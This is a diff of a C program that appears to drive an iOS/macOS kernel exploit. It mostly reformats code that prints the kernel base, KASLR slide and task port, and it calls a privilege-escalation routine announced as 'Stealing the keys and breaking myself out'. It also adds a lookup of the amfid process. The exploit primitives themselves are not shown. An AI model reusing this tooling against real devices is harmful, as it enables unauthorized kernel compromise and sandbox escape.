@@ -33,7 +33,9 @@ int initialize()
     }
 
     printf("\n");
-    return !(toolbox && (toolbox->initialised = (toolbox && toolbox->header && toolbox->commands && toolbox->offsets)));
+    return !(toolbox &&
+             (toolbox->initialised = (toolbox && toolbox->header &&
+                                      toolbox->commands && toolbox->offsets)));
 }
 
 int main(int argc, char **argv)
@@ -46,18 +48,24 @@ int main(int argc, char **argv)
         return 1;
     }
 
-    printf("\n[*] Base at: 0x%llx, kaslr slide: 0x%llx, kern struct: 0x%llx", toolbox->base, toolbox->slide,
-           find_proc(toolbox, 0));
-    printf("\n[*] Allproc: %llx, task_port: %llx", toolbox->allproc, toolbox->offsets->my_task_port);
+    printf("\n[*] Base at: 0x%llx, kaslr slide: 0x%llx, kern struct: 0x%llx",
+           toolbox->base, toolbox->slide, find_proc(toolbox, 0));
+    printf("\n[*] Allproc: %llx, task_port: %llx", toolbox->allproc,
+           toolbox->offsets->my_task_port);
 
     printf("\n[*] Stealing the keys and breaking myself out - ");
     if (safe_elevate(toolbox, find_pid(toolbox, argv[0])) || test_rw())
         return 1;
 
-    printf("\n%s", (read_pointer(toolbox, read_pointer(toolbox, toolbox->offsets->my_task_port + __ip_kobject_offset) +
-                                              __bsd_info) == toolbox->offsets->my_proc)
-                       ? "[*] task_port found"
-                       : "Huh? You got the wrong task_port my friend");
+    printf("\n%s",
+           (read_pointer(toolbox,
+                         read_pointer(toolbox, toolbox->offsets->my_task_port +
+                                                   __ip_kobject_offset) +
+                             __bsd_info) == toolbox->offsets->my_proc)
+               ? "[*] task_port found"
+               : "Huh? You got the wrong task_port my friend");
+
+    printf("Amfid pid: %d", find_pid(toolbox, "amfid"));
 
     return 0;
 }
